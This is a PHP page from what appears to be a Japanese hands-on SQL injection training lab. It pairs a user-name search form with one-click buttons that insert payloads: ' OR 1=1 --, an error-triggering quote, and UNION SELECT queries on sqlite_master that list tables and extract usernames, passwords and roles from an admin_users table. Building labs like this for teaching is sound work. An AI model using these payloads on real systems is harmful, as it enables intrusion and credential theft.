<?php
$title = "SQLインジェクション実行環境";
require dirname(__DIR__) . "/includes/header.php";
?>

<div class="row">
    <div class="col">
        <div class="card">
            <h5 class="card-header">ワンクリックで入力フォームに代入</h5>
            <div class="card-body">
                <div class="list-group">
                    <div class="list-group-item bg-dark text-white fw-bold small">まずは、簡単な体験</div>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' OR 1=1 --`)">
                        <code class="text-danger fw-bold">' OR 1=1 --</code>
                        <div class="small text-muted">全件表示</div>
                    </button>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`'`)">
                        <code class="text-danger fw-bold">'</code>
                        <div class="small text-muted">SQLエラーを表示させる</div>
                    </button>
                    <div class="list-group-item bg-dark text-white fw-bold small">そして、本格的な攻撃</div>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' UNION SELECT 1, name FROM sqlite_master WHERE type='table' --`)">
                        <code class="text-danger fw-bold">' UNION SELECT...</code>
                        <div class="small text-muted">UNION攻撃で他のテーブルを確認</div>
                    </button>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' UNION SELECT 1, sql FROM sqlite_master WHERE name='admin_users' --`)">
                        <code class="text-danger fw-bold">' UNION SELECT...</code>
                        <div class="small text-muted">UNION攻撃でユーザーテーブルのカラムを確認</div>
                    </button>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' UNION SELECT id, username || ' / PW:' || password || ' / Role:' || role FROM admin_users --`)">
                        <code class="text-danger fw-bold">' UNION SELECT...</code>
                        <div class="small text-muted">UNION攻撃でユーザーテーブルからパスワードなどを入手</div>
                        <div class="small text-muted">※本来はDBにパスワードなどは暗号化され、ソルトがあるのが一般的です</div>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="col">
        <div class="card">
            <h5 class="card-header">ユーザー名検索フォーム</h5>
            <div class="card-body">
                <form hx-get="../db/user.php" hx-target="#result" class="mt-2">
                    <div class="d-flex gap-2 align-items-end">
                        <div class="form-floating flex-grow-1">
                            <input type="text" id="search-input" name="name" class="form-control">
                            <label for="search-input">名前</label>
                        </div>

                        <button type="submit"
                            class="btn btn-primary fw-bold text-nowrap flex-shrink-0">
                            検索
                        </button>
                    </div>
                </form>

                <div class="mt-3">
                    <p class="small text-muted mb-2 fw-bold">【登録済みユーザー（クリックで入力）】</p>
                    <div class="d-flex flex-wrap gap-2">
                        <style>
                            .user-tag {
                                cursor: pointer;
                                transition: 0.2s;
                            }

                            .user-tag:hover {
                                background-color: #e9ecef !important;
                            }
                        </style>

                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">佐藤太郎</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">鈴木花子</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">高橋一郎</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">田中美咲</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">伊藤健</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">渡辺奈々</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">山本翔</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">中村優子</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">小林直樹</span>
                        <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">加藤真由美</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="card mt-4">
            <h5 class="card-header">実行結果出力 (Database Output)</h5>
            <div class="card-body">
                <div id="result" class="card-body text-break">
                    <span class=" text-muted small">ここに検索結果が表示されます...</span>
                </div>
            </div>
        </div>
    </div>
</div>


<!-- クリック時のコピー -->
<script>
    function copyToInput(text) {
        const input = document.querySelector("input[name='name']");
        input.value = text;
        input.focus();
        // 視覚的なフィードバック
        input.classList.add('is-valid');
        setTimeout(() => input.classList.remove('is-valid'), 300);
    }
</script>

<?php require dirname(__DIR__) . "/includes/footer.php"; ?>